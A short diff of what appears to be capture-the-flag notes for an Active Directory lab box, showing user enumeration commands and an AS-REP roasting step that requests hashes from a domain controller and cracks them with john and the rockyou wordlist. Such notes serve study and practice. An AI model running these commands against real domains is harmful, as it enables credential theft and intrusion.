@@ -14,6 +14,7 @@
       commands:
                enumdomusers
                queryuser
+
 ### AS-REP Roasting:
       ./GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
       john --wordlist=/usr/share/wordlists/rockyou.txt hash
